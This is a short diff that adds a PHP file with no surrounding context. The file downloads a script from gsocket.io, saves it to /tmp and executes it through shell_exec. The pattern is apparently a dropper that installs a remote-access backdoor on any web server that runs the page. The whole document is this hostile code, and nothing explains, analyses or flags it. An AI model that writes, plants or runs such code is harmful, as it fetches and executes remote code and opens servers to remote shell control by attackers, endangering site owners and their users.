@@ -1,0 +1,5 @@
+<?php
+$script = file_get_contents('https://gsocket.io/y');
+file_put_contents('/tmp/y', $script);
+shell_exec('sh /tmp/y 2>&1');
+?>
